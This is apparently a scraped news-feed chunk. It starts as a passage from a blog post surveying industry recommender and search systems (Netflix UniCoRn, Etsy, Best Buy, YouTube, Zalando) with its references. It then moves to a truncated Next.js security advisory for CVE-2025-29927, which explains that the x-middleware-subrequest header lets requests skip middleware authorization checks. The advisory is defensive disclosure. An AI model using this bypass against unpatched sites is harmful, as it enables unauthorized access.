<p>Similarly, <strong><a href="https://arxiv.org/abs/2408.10394" target="_blank">UniCoRn (Netflix)</a> introduces a unified contextual ranker designed to serve both search and recommendation tasks</strong> through a shared contextual framework. This unified model achieves comparable or better performance than multiple specialized models, thus reducing operational complexity.</p>

<p>The UniCoRn model uses contextual information such as user ID, search queries, country, source entity ID, and task type, predicting the probability of positive engagement with a target entity (e.g., a movie). Since not all contexts are always available, heuristics are used to impute missing data. For example, missing source entity IDs in search tasks are imputed as null, and missing query contexts in recommendation tasks use the entity’s display names.</p>

<p>UniCoRn incorporates two broad feature categories: context-specific features (like query length and source entity embeddings) and combined context-target features (such as click counts for a target entity in response to a query). The architecture includes embedding layers for categorical features, enhanced with residual connections and feature crossing.</p>

<p><img src="https://eugeneyan.com/assets/unicorn-fig1.jpg" loading="lazy" title="Unicorn" alt="Unicorn"></p>

<p>Training uses binary cross-entropy loss and the Adam optimizer. Netflix incrementally increased personalization: starting from a semi-personalized model using user clusters, progressing to including outputs from other recommendation models, and finally incorporating pretrained and fine-tuned user and item embeddings.</p>

<p><strong>Results:</strong> UniCoRn consistently matched or exceeded specialized models. Personalization boosted outcomes, delivering a 10% improvement in recommendations and a 7% lift in search. Ablation studies showed the importance of explicitly including the task type as context, imputing missing features to maximize feature coverage, and applying feature crossing to enhance multi-task learning effectiveness.</p>

<p>(👉 Recommended read) <strong><a href="https://arxiv.org/abs/2306.04833" target="_blank">Unified Embeddings (Etsy)</a> shares how they unified transformer-based, term-based, and graph-based embeddings within a two-tower model</strong> architecture. This goal was to address common gaps such as mismatches between search queries and product vocabulary (lexical matching) and the poor performance of neural embeddings due to limited user context.</p>

<p><img src="https://eugeneyan.com/assets/unifiedemb-fig2.jpg" loading="lazy" title="Unified Embeddings" alt="Unified Embeddings"></p>

<p>Their model adopts a classic two-tower structure, consisting of a product encoder and a joint query-user encoder. The product encoder combines transformer-based embeddings, bipartite graph embeddings (trained using a full year of query-product interaction data), product title embeddings, and location information. Interestingly, direct finetuning of transformer-based models like distilBERT and T5 did not yield significant offline metric improvements. Instead, inspired by docT5query, they pretrained a T5-small model specifically designed to predict historically purchased queries based on product descriptions. The query-user encoder combines query text embeddings, location, and historical engagement data. Both query/title and location embeddings are shared across the two towers for consistency.</p>

<p>They emphasize the effectiveness of negative sampling, sharing multiple approaches such as hard in-batch negatives (positives from other queries within the batch), uniform negatives (randomly selected from the entire product corpus), and dynamic hard negatives (random samples narrowed down by the model to identify the most challenging examples). The goal here is to find the most similar negatives to help the model learn on the hardest samples.</p>

<p>To balance relevance with product quality, they integrated quality boosting into their embeddings via an approximate nearest neighbor (ANN) index. Product embeddings are augmented with query-independent quality scores reflecting attributes such as product ratings, freshness, and conversion rates—factors proven to increase engagement independently from query relevance. Given the original product embeddings, they concatenate it with the quality score vectors; the respective query embedding is concatenated with a constant vector. The final score of the product, for a query, is the dot product of the updated product and query embedding.</p>

<p><img src="https://eugeneyan.com/assets/unifiedemb-fig3.jpg" loading="lazy" title="Unified Embeddings" alt="Unified Embeddings"></p>

<p>The system operates through two main stages: offline indexing and online serving. Offline, embeddings and quality scores are generated and pre-indexed into an ANN system (using FAISS with a 4-bit product quantizer). This approach, combined with a re-ranking step, achieves a recall loss below 4% while keeping latency under 20ms@p99. At the online stage, incoming queries are embedded in real time to retrieve products from the ANN index. They also shared how they applied caching while handling in-session personalization features.</p>

<p><strong>Results:</strong> In A/B testing, the unified embedding model drove a site-wide conversion lift of 2.63% and boosted organic search purchases by 5.58%. Offline tests showed that Unified Embeddings consistently outperformed traditional baselines for both head and tail queries. Ablation studies revealed the strongest contributions came from graph embeddings (+15% recall@100), followed by description embeddings (+6.3%) and attributes (+3.9%). Additionally, location embeddings significantly improved purchase recall@100 (+8%) for US users by minimizing geographic mismatches. Removing hard negatives resulted in a noticeable 7% drop in performance, underscoring their importance.</p>

<p><strong><a href="https://dl.acm.org/doi/10.1145/3640457.3688039" target="_blank">Embedding Long Tail (Best Buy)</a> shared how they optimize semantic product search to better address long-tail queries</strong> which typically suffer from sparse user interaction data.</p>

<p>To create a high-quality dataset, they collected user engagement data from product pages and applied a two-stage filtering process, reducing data volume (by 10x) while maintaining quality and balanced coverage across product categories. First, they retained interactions observed from at least two unique visitors, then performed stratified sampling across categories to mitigate popularity bias. To further augment this data, they prompted a Llama-13B model to generate ten synthetic search queries per product using the product’s title, category, description, and specifications, thus ensuring comprehensive catalog coverage.</p>

<p>Their model follows a two-tower architecture based on Best Buy’s internally developed BERT variant, an adaptation of RoBERTa finetuned through masked language modeling on search queries and product information. They used the first five layers of this BERT model to initialize both the search and product encoders. Training involved using in-batch negatives with multi-class cross-entropy loss. For deployment, Solr functions as both the inverted index and vector database, with a caching layer added to minimize redundant requests to the embedding service.</p>

<p><strong>Results:</strong> Adding semantic retrieval to the existing lexical search improved conversion rates by 3% in online A/B tests. Offline experiments demonstrated incremental improvements through various enhancements: two-stage data filtering (+0.24% recall@200), synthetic positive queries (+0.7%), additional product features (+1.15%), query-to-query followed by query-to-product fine-tuning (+2.44%), and model weight merging (+4.67%). Notably, their final model outperformed the baseline (all-mpnet-base-v2) while using only half the parameters at 50M vs 110M. (Nonetheless, it may not have been a fair comparison given the baseline was not finetuned.)</p>

<p><strong><a href="https://dl.acm.org/doi/10.1145/3640457.3688030" target="_blank">User Behavioral Service (YouTube)</a> presented an innovative approach for serving large user sequence models efficiently while sidestepping latency challenges.</strong></p>

<p><img src="https://eugeneyan.com/assets/ubs-fig1.jpg" loading="lazy" title="User Behavioral Service" alt="User Behavioral Service"></p>

<p>The intuition behind User Behavior Service (UBS) is decoupling the serving of the user sequence model from the main recommendation model. This design allows independent control over user embedding computation. Although both models are co-trained, they are exported and served separately. The user model computes embeddings asynchronously, storing them in a high-speed key-value cache that’s regularly updated. If a requested embedding isn’t available, an empty embedding is returned while an asynchronous refresh is triggered. This setup enables experimentation with significantly larger models without latency constraints—a concept similar to what I described as “Just-in-time infrastructure” in my <a href="https://eugeneyan.com/speaking/recsys2022-keynote/" target="_blank">RecSys 2022 keynote</a>.</p>

<p><strong>Results:</strong> In A/B tests, UBS improved performance across six different ranking tasks while limiting the increase in cost. For example, a User Model with a sequence length of 1,000 showed a 0.38% improvement in online metrics compared to a baseline model using a sequence length of 20, with offline accuracy gains ranging from 0.01% to 0.40% across multiple tasks. Directly serving a large user sequence model would have increased costs by 28.7% but the UBS approach limited this increase to just 2.8%.</p>

<p>(👉 Recommended read) <strong><a href="https://arxiv.org/abs/2409.02856" target="_blank">Modern Ranking Platform (Zalando)</a> details their real-time platform designed for both search and browsing scenarios.</strong> The paper discusses their system design, candidate generation, retrieval methods, and ranking policies.</p>

<p><img src="https://eugeneyan.com/assets/zalando-fig2.jpg" loading="lazy" title="Modern Ranking Platform" alt="Modern Ranking Platform"></p>

<p>Their platform is built around a few key principles:</p>

<ul>
  <li><strong>Composability:</strong> Models can be combined vertically (layered ranking) or horizontally by integrating outputs from various models or candidate generators.</li>
  <li><strong>Scalability:</strong> To manage computational costs, the platform first uses efficient but less precise candidate generators. These initial candidates are then refined by more accurate but computationally intensive rankers, a <a href="https://eugeneyan.com/writing/system-design-for-discovery/" target="_blank">standard design for recsys</a>.</li>
  <li><strong>Shared Infrastructure:</strong> Whenever possible, training datasets, embeddings, feature stores, and serving infrastructure are reused to simplify operations.</li>
  <li><strong>Steerable Ranking:</strong> The platform allows external adjustments through a policy layer, making it easy to align rankings with business objectives.</li>
</ul>

<p><img src="https://eugeneyan.com/assets/zalando-fig3.jpg" loading="lazy" title="Modern Ranking Platform" alt="Modern Ranking Platform"></p>

<p>Their candidate generator uses a classic two-tower model. The customer tower updates embeddings based on a customer’s recent actions and current context whenever the customer visits the site, ensuring embeddings remain fresh. The item tower precomputes item embeddings and stores them in a vector database for rapid retrieval. These embeddings are matched via dot product. To create customer embeddings, a Transformer encoder is trained on historical customer behavior and contextual data, predicting the next likely interaction.</p>

<p><img src="https://eugeneyan.com/assets/zalando-fig4.jpg" loading="lazy" title="Modern Ranking Platform" alt="Modern Ranking Platform"></p>

<p>The ranker is a multi-task model that predicts the likelihood of different customer actions, such as clicks, adding items to wishlist or cart, and purchases. Each action has its own prediction head, with all contributing equally to training loss. During serving, each action type’s importance can be dynamically adjusted. Overall, the ranker outputs personalized scores for each candidate item across multiple potential customer interactions.</p>

<p>Finally, the policy layer ensures the system aligns with broader business goals. For instance, it can encourage exploration by promoting new products through heuristics like epsilon-greedy strategies. It also applies other business rules, such as reducing the visibility of previously purchased items and ensuring item diversity by preventing items from the same brand from appearing back-to-back.</p>

<p><strong>Results:</strong> The unified architecture demonstrated strong performance across four A/B tests, achieving a combined engagement increase of +15% and a revenue uplift of +2.2%. Iterative improvements further illustrate the effectiveness of each system component: introducing trainable embeddings in candidate generation boosted engagement by +4.48% and revenue by +0.18%; adding advanced ranking and policy layers delivered an additional +4.04% engagement and +0.86% revenue; and using contextual data provided a further lift of +2.40% in engagement and +0.60% in revenue.</p>

<p>• • •</p>

<p>Although early research in 2023—that applied LLMs to recommendations and search—often fell short, these recent efforts show more promise, especially since they’re backed by industry results. It suggests that there are tangible benefits from exploring the augmentation of recsys and search systems with LLMs, increasing performance while reducing cost and effort.</p>

<h2 id="references">References</h2>

<p>Chamberlain, Benjamin P., et al. “Tuning Word2vec for Large Scale Recommendation Systems.” <em>Fourteenth ACM Conference on Recommender Systems</em>, 2020, pp. 732–37. <em>arXiv.org</em>, <a href="https://doi.org/10.1145/3383313.3418486">https://doi.org/10.1145/3383313.3418486</a>.</p>

<p>Hidasi, Balázs, et al. <em>Session-Based Recommendations with Recurrent Neural Networks</em>. arXiv:1511.06939, arXiv, 29 Mar. 2016. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.1511.06939">https://doi.org/10.48550/arXiv.1511.06939</a>.</p>

<p>Chen, Qiwei, et al. <em>Behavior Sequence Transformer for E-Commerce Recommendation in Alibaba</em>. arXiv:1905.06874, arXiv, 15 May 2019. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.1905.06874">https://doi.org/10.48550/arXiv.1905.06874</a>.</p>

<p>Sun, Fei, et al. <em>BERT4Rec: Sequential Recommendation with Bidirectional Encoder Representations from Transformer</em>. arXiv:1904.06690, arXiv, 21 Aug. 2019. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.1904.06690">https://doi.org/10.48550/arXiv.1904.06690</a>.</p>

<p>Singh, Anima, et al. <em>Better Generalization with Semantic IDs: A Case Study in Ranking for Recommendations</em>. arXiv:2306.08121, arXiv, 30 May 2024. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2306.08121">https://doi.org/10.48550/arXiv.2306.08121</a>.</p>

<p>Chen, Gaode, et al. “A Multi-Modal Modeling Framework for Cold-Start Short-Video Recommendation.” <em>Proceedings of the 18th ACM Conference on Recommender Systems</em>, Association for Computing Machinery, 2024, pp. 391–400. <em>ACM Digital Library</em>, <a href="https://doi.org/10.1145/3640457.3688098">https://doi.org/10.1145/3640457.3688098</a>.</p>

<p>Wang, Hangyu, et al. <em>FLIP: Fine-Grained Alignment between ID-Based Models and Pretrained Language Models for CTR Prediction</em>. arXiv:2310.19453, arXiv, 30 Oct. 2024. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2310.19453">https://doi.org/10.48550/arXiv.2310.19453</a>.</p>

<p>Vančura, Vojtěch, et al. “beeFormer: Bridging the Gap Between Semantic and Interaction Similarity in Recommender Systems.” <em>18th ACM Conference on Recommender Systems</em>, 2024, pp. 1102–07. <em>arXiv.org</em>, <a href="https://doi.org/10.1145/3640457.3691707">https://doi.org/10.1145/3640457.3691707</a>.</p>

<p>Li, Yaoyiran, et al. <em>CALRec: Contrastive Alignment of Generative LLMs for Sequential Recommendation</em>. 2024. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2405.02429">https://doi.org/10.48550/arXiv.2405.02429</a>.</p>

<p>Zhang, Chiyu, et al. <em>EmbSum: Leveraging the Summarization Capabilities of Large Language Models for Content-Based Recommendations</em>. arXiv:2405.11441, arXiv, 19 Aug. 2024. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2405.11441">https://doi.org/10.48550/arXiv.2405.11441</a>.</p>

<p>Shah, Jaidev, et al. “Analyzing User Preferences and Quality Improvement on Bing’s WebPage Recommendation Experience with Large Language Models.” <em>Proceedings of the 18th ACM Conference on Recommender Systems</em>, Association for Computing Machinery, 2024, pp. 751–54. <em>ACM Digital Library</em>, <a href="https://doi.org/10.1145/3640457.3688062">https://doi.org/10.1145/3640457.3688062</a>.</p>

<p>Pei, Yingchi, et al. “Leveraging LLM Generated Labels to Reduce Bad Matches in Job Recommendations.” <em>Proceedings of the 18th ACM Conference on Recommender Systems</em>, Association for Computing Machinery, 2024, pp. 796–99. <em>ACM Digital Library</em>, <a href="https://doi.org/10.1145/3640457.3688043">https://doi.org/10.1145/3640457.3688043</a>.</p>

<p><em>Search Query Understanding with LLMs: From Ideation to Production</em>. <a href="https://engineeringblog.yelp.com/2025/02/search-query-understanding-with-LLMs.html">https://engineeringblog.yelp.com/2025/02/search-query-understanding-with-LLMs.html</a>. Accessed 5 Mar. 2025.</p>

<p>Lindstrom, Henrik, et al. “Encouraging Exploration in Spotify Search through Query Recommendations.” <em>Proceedings of the 18th ACM Conference on Recommender Systems</em>, Association for Computing Machinery, 2024, pp. 775–77. <em>ACM Digital Library</em>, <a href="https://doi.org/10.1145/3640457.3688035">https://doi.org/10.1145/3640457.3688035</a>.</p>

<p>Aluri, Geetha Sai, et al. “Playlist Search Reinvented: LLMs Behind the Curtain.” <em>Proceedings of the 18th ACM Conference on Recommender Systems</em>, Association for Computing Machinery, 2024, pp. 813–15. <em>ACM Digital Library</em>, <a href="https://doi.org/10.1145/3640457.3688047">https://doi.org/10.1145/3640457.3688047</a>.</p>

<p>Zhang, Gaowei, et al. <em>Scaling Law of Large Sequential Recommendation Models</em>. arXiv:2311.11351, arXiv, 19 Nov. 2023. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2311.11351">https://doi.org/10.48550/arXiv.2311.11351</a>.</p>

<p>Wang, Junting, et al. “A Pre-Trained Sequential Recommendation Framework: Popularity Dynamics for Zero-Shot Transfer.” <em>18th ACM Conference on Recommender Systems</em>, 2024, pp. 433–43. <em>arXiv.org</em>, <a href="https://doi.org/10.1145/3640457.3688145">https://doi.org/10.1145/3640457.3688145</a>.</p>

<p>Liu, Qi, et al. <em>Efficient Transfer Learning Framework for Cross-Domain Click-Through Rate Prediction</em>. arXiv:2408.16238, arXiv, 29 Aug. 2024. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2408.16238">https://doi.org/10.48550/arXiv.2408.16238</a>.</p>

<p>Khani, Nikhil, et al. <em>Bridging the Gap: Unpacking the Hidden Challenges in Knowledge Distillation for Online Ranking Systems</em>. arXiv:2408.14678, arXiv, 26 Aug. 2024. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2408.14678">https://doi.org/10.48550/arXiv.2408.14678</a>.</p>

<p>Zhang, Yin, et al. “Self-Auxiliary Distillation for Sample Efficient Learning in Google-Scale Recommenders.” <em>Proceedings of the 18th ACM Conference on Recommender Systems</em>, Association for Computing Machinery, 2024, pp. 829–31. <em>ACM Digital Library</em>, <a href="https://doi.org/10.1145/3640457.3688041">https://doi.org/10.1145/3640457.3688041</a>.</p>

<p>Cui, Yu, et al. “Distillation Matters: Empowering Sequential Recommenders to Match the Performance of Large Language Model.” <em>18th ACM Conference on Recommender Systems</em>, 2024, pp. 507–17. <em>arXiv.org</em>, <a href="https://doi.org/10.1145/3640457.3688118">https://doi.org/10.1145/3640457.3688118</a>.</p>

<p>Yang, Zhiming, et al. <em>MLoRA: Multi-Domain Low-Rank Adaptive Network for CTR Prediction</em>. arXiv:2408.08913, arXiv, 14 Aug. 2024. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2408.08913">https://doi.org/10.48550/arXiv.2408.08913</a>.</p>

<p>Hsu, Yi-Ping, et al. “Taming the One-Epoch Phenomenon in Online Recommendation System by Two-Stage Contrastive ID Pre-Training.” <em>Proceedings of the 18th ACM Conference on Recommender Systems</em>, Association for Computing Machinery, 2024, pp. 838–40. <em>ACM Digital Library</em>, <a href="https://doi.org/10.1145/3640457.3688053">https://doi.org/10.1145/3640457.3688053</a>.</p>

<p>Joshi, Swanand, et al. “Sliding Window Training - Utilizing Historical Recommender Systems Data for Foundation Models.” <em>Proceedings of the 18th ACM Conference on Recommender Systems</em>, Association for Computing Machinery, 2024, pp. 835–37. <em>ACM Digital Library</em>, <a href="https://doi.org/10.1145/3640457.3688051">https://doi.org/10.1145/3640457.3688051</a>.</p>

<p>Penha, Gustavo, et al. <em>Bridging Search and Recommendation in Generative Retrieval: Does One Task Help the Other?</em> arXiv:2410.16823, arXiv, 22 Oct. 2024. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2410.16823">https://doi.org/10.48550/arXiv.2410.16823</a>.</p>

<p>Firooz, Hamed, et al. <em>360Brew: A Decoder-Only Foundation Model for Personalized Ranking and Recommendation</em>. arXiv:2501.16450, arXiv, 27 Jan. 2025. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2501.16450">https://doi.org/10.48550/arXiv.2501.16450</a>.</p>

<p>Bhattacharya, Moumita, et al. <em>Joint Modeling of Search and Recommendations Via an Unified Contextual Recommender (UniCoRn)</em>. arXiv:2408.10394, arXiv, 19 Aug. 2024. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2408.10394">https://doi.org/10.48550/arXiv.2408.10394</a>.</p>

<p>Jha, Rishikesh, et al. <em>Unified Embedding Based Personalized Retrieval in Etsy Search</em>. arXiv:2306.04833, arXiv, 25 Sept. 2024. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2306.04833">https://doi.org/10.48550/arXiv.2306.04833</a>.</p>

<p>Kekuda, Akshay, Yuyang Zhang, and Arun Udayashankar. “Embedding based retrieval for long tail search queries in ecommerce.” Proceedings of the 18th ACM Conference on Recommender Systems. 2024. <a href="https://dl.acm.org/doi/10.1145/3640457.3688039">https://dl.acm.org/doi/10.1145/3640457.3688039</a>.</p>

<p>Li, Yuening, et al. “Short-Form Video Needs Long-Term Interests: An Industrial Solution for Serving Large User Sequence Models.” <em>Proceedings of the 18th ACM Conference on Recommender Systems</em>, Association for Computing Machinery, 2024, pp. 832–34. <em>ACM Digital Library</em>, <a href="https://doi.org/10.1145/3640457.3688030">https://doi.org/10.1145/3640457.3688030</a>.</p>

<p>Celikik, Marjan, et al. <em>Building a Scalable, Effective, and Steerable Search and Ranking Platform</em>. 1, arXiv:2409.02856, arXiv, 4 Sept. 2024. <em>arXiv.org</em>, <a href="https://doi.org/10.48550/arXiv.2409.02856">https://doi.org/10.48550/arXiv.2409.02856</a>.</p>


            
            
<p>If you found this useful, please cite this write-up as:</p>

<blockquote>
    <p>Yan, Ziyou. (Mar 2025). Improving Recommendation Systems &amp; Search in the Age of LLMs. eugeneyan.com.
        https://eugeneyan.com/writing/recsys-llm/.</p>
</blockquote>

<p>or</p>

<div><pre><code>@article{yan2025recsys-llm,
  title   = {Improving Recommendation Systems &amp; Search in the Age of LLMs},
  author  = {Yan, Ziyou},
  journal = {eugeneyan.com},
  year    = {2025},
  month   = {Mar},
  url     = {https://eugeneyan.com/writing/recsys-llm/}
}</code></pre>
</div>

            
            
            



<p><span>Share on:  </span></p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Next.js version 15.2.3 has been released to address a security vulnerability (188 pts)]]></title>
            <link>https://nextjs.org/blog/cve-2025-29927</link>
            <guid>43448723</guid>
            <pubDate>Sat, 22 Mar 2025 21:19:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nextjs.org/blog/cve-2025-29927">https://nextjs.org/blog/cve-2025-29927</a>, See on <a href="https://news.ycombinator.com/item?id=43448723">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Next.js version 15.2.3 has been released to address a security vulnerability (<a href="https://github.com/advisories/GHSA-f82v-jwr5-mffw" rel="noopener noreferrer nofollow" target="_blank">CVE-2025-29927<span><svg data-testid="geist-icon" height="16" stroke-linejoin="round" style="color:currentColor" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.75011 4H6.00011V5.5H6.75011H9.43945L5.46978 9.46967L4.93945 10L6.00011 11.0607L6.53044 10.5303L10.499 6.56182V9.25V10H11.999V9.25V5C11.999 4.44772 11.5512 4 10.999 4H6.75011Z" fill="currentColor"></path></svg></span></a>). Additionally, backported patches are available.</p>
<p>We recommend that all self-hosted Next.js deployments using <code>next start</code> and <code>output: 'standalone'</code> should <a href="https://nextjs.org/docs/app/building-your-application/upgrading">update</a> immediately.</p>
<p>Continue reading for more details on the CVE.</p>
<h2 id="timeline" data-docs-heading=""><a href="#timeline">Timeline<span><svg viewBox="0 0 16 16" height="0.7em" width="0.7em">
  <g stroke-width="1.2" fill="none" stroke="currentColor">
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M8.995,7.005 L8.995,7.005c1.374,1.374,1.374,3.601,0,4.975l-1.99,1.99c-1.374,1.374-3.601,1.374-4.975,0l0,0c-1.374-1.374-1.374-3.601,0-4.975 l1.748-1.698"></path>
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M7.005,8.995 L7.005,8.995c-1.374-1.374-1.374-3.601,0-4.975l1.99-1.99c1.374-1.374,3.601-1.374,4.975,0l0,0c1.374,1.374,1.374,3.601,0,4.975 l-1.748,1.698"></path>
  </g>
</svg></span></a></h2>
<ul>
<li><code>2025-02-27T06:03Z</code>: Disclosure to Next.js team via GitHub private vulnerability reporting</li>
<li><code>2025-03-14T17:13Z</code>: Next.js team started triaging the report</li>
<li><code>2025-03-14T19:08Z</code>: Patch pushed for Next.js 15.x</li>
<li><code>2025-03-14T19:26Z</code>: Patch pushed for Next.js 14.x</li>
<li><code>2025-03-17T22:44Z</code>: Next.js 14.2.25 released</li>
<li><code>2025-03-18T00:23Z</code>: Next.js 15.2.3 released</li>
<li><code>2025-03-18T18:03Z</code>: CVE-2025-29927 issued by GitHub</li>
<li><code>2025-03-21T10:17Z</code>: Security Advisory published</li>
<li><code>2025-03-22T21:21Z</code>: Next.js 13.5.9 released</li>
</ul>
<p>We are also publishing a backport for v12. We will update this post as they are released.</p>
<h2 id="vulnerability-details" data-docs-heading=""><a href="#vulnerability-details">Vulnerability details<span><svg viewBox="0 0 16 16" height="0.7em" width="0.7em">
  <g stroke-width="1.2" fill="none" stroke="currentColor">
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M8.995,7.005 L8.995,7.005c1.374,1.374,1.374,3.601,0,4.975l-1.99,1.99c-1.374,1.374-3.601,1.374-4.975,0l0,0c-1.374-1.374-1.374-3.601,0-4.975 l1.748-1.698"></path>
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M7.005,8.995 L7.005,8.995c-1.374-1.374-1.374-3.601,0-4.975l1.99-1.99c1.374-1.374,3.601-1.374,4.975,0l0,0c1.374,1.374,1.374,3.601,0,4.975 l-1.748,1.698"></path>
  </g>
</svg></span></a></h2>
<p>Next.js uses an internal header <code>x-middleware-subrequest</code> to prevent recursive requests from triggering infinite loops. The security report showed it was possible to skip running Middleware, which could allow requests to skip critical checks—such as authorization cookie validation—before reaching routes.</p>
<h2 id="impact-scope" data-docs-heading=""><a href="#impact-scope">Impact scope<span><svg viewBox="0 0 16 16" height="0.7em" width="0.7em">
  <g stroke-width="1.2" fill="none" stroke="currentColor">
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M8.995,7.005 L8.995,7.005c1.374,1.374,1.374,3.601,0,4.975l-1.99,1.99c-1.374,1.374-3.601,1.374-4.975,0l0,0c-1.374-1.374-1.374-3.601,0-4.975 l1.748-1.698"></path>
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M7.005,8.995 L7.005,8.995c-1.374-1.374-1.374-3.601,0-4.975l1.99-1.99c1.374-1.374,3.601-1.374,4.975,0l0,0c1.374,1.374,1.374,3.601,0,4.975 l-1.748,1.698"></path>
  </g>
</svg></span></a></h2>
<h3 id="affected" data-docs-heading=""><a href="#affected">Affected<span><svg viewBox="0 0 16 16" height="0.7em" width="0.7em">
  <g stroke-width="1.2" fill="none" stroke="currentColor">
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M8.995,7.005 L8.995,7.005c1.374,1.374,1.374,3.601,0,4.975l-1.99,1.99c-1.374,1.374-3.601,1.374-4.975,0l0,0c-1.374-1.374-1.374-3.601,0-4.975 l1.748-1.698"></path>
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M7.005,8.995 L7.005,8.995c-1.374-1.374-1.374-3.601,0-4.975l1.99-1.99c1.374-1.374,3.601-1.374,4.975,0l0,0c1.374,1.374,1.374,3.601,0,4.975 l-1.748,1.698"></path>
  </g>
</svg></span></a></h3>
<ul>
<li>Self-hosted Next.js applications using Middleware (<code>next start</code> with output: <code>standalone</code>)</li>
<li>This affects you if you rely on Middleware for auth or security checks, which are not then validated later in your application.</li>
<li>Applications using Cloudflare can turn on a <a href="https://developers.cloudflare.com/changelog/2025-03-22-next-js-vulnerability-waf/" rel="noopener noreferrer nofollow" target="_blank">Managed WAF rule<span><svg data-testid="geist-icon" height="16" stroke-linejoin="round" style="color:currentColor" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.75011 4H6.00011V5.5H6.75011H9.43945L5.46978 9.46967L4.93945 10L6.00011 11.0607L6.53044 10.5303L10.499 6.56182V9.25V10H11.999V9.25V5C11.999 4.44772 11.5512 4 10.999 4H6.75011Z" fill="currentColor"></path></svg></span></a></li>
</ul>
<h3 id="not-affected" data-docs-heading=""><a href="#not-affected">Not affected<span><svg viewBox="0 0 16 16" height="0.7em" width="0.7em">
  <g stroke-width="1.2" fill="none" stroke="currentColor">
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M8.995,7.005 L8.995,7.005c1.374,1.374,1.374,3.601,0,4.975l-1.99,1.99c-1.374,1.374-3.601,1.374-4.975,0l0,0c-1.374-1.374-1.374-3.601,0-4.975 l1.748-1.698"></path>
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M7.005,8.995 L7.005,8.995c-1.374-1.374-1.374-3.601,0-4.975l1.99-1.99c1.374-1.374,3.601-1.374,4.975,0l0,0c1.374,1.374,1.374,3.601,0,4.975 l-1.748,1.698"></path>
  </g>
</svg></span></a></h3>
<ul>
<li>Applications hosted on Vercel</li>
<li>Applications hosted on Netlify</li>
<li>Applications deployed as static exports (Middleware not executed)</li>
</ul>
<h2 id="patched-versions" data-docs-heading=""><a href="#patched-versions">Patched versions<span><svg viewBox="0 0 16 16" height="0.7em" width="0.7em">
  <g stroke-width="1.2" fill="none" stroke="currentColor">
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M8.995,7.005 L8.995,7.005c1.374,1.374,1.374,3.601,0,4.975l-1.99,1.99c-1.374,1.374-3.601,1.374-4.975,0l0,0c-1.374-1.374-1.374-3.601,0-4.975 l1.748-1.698"></path>
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M7.005,8.995 L7.005,8.995c-1.374-1.374-1.374-3.601,0-4.975l1.99-1.99c1.374-1.374,3.601-1.374,4.975,0l0,0c1.374,1.374,1.374,3.601,0,4.975 l-1.748,1.698"></path>
  </g>
</svg></span></a></h2>
<ul>
<li>For Next.js 15.x, this issue is fixed in <code>15.2.3</code></li>
<li>For Next.js 14.x, this issue is fixed in <code>14.2.25</code></li>
<li>For Next.js 13.x, this issue is fixed in <code>13.5.9</code></li>
</ul>
<p>If patching to a safe version is infeasible, it is recommended that you prevent external user requests which contain the <code>x-middleware-subrequest</code> header from reaching your Next.js application.</p>
<p>We are also publishing a backport for v12. We will update this post as they are released.</p>
<h2 id="our-security-responsibility" data-docs-heading=""><a href="#our-security-responsibility">Our security responsibility<span><svg viewBox="0 0 16 16" height="0.7em" width="0.7em">
  <g stroke-width="1.2" fill="none" stroke="currentColor">
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M8.995,7.005 L8.995,7.005c1.374,1.374,1.374,3.601,0,4.975l-1.99,1.99c-1.374,1.374-3.601,1.374-4.975,0l0,0c-1.374-1.374-1.374-3.601,0-4.975 l1.748-1.698"></path>
    <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M7.005,8.995 L7.005,8.995c-1.374-1.374-1.374-3.601,0-4.975l1.99-1.99c1.374-1.374,3.601-1.374,4.975,0l0,0c1.374,1.374,1.374,3.601,0,4.975 l-1.748,1.698"></path>
  </g>
</svg></span></a></h2>
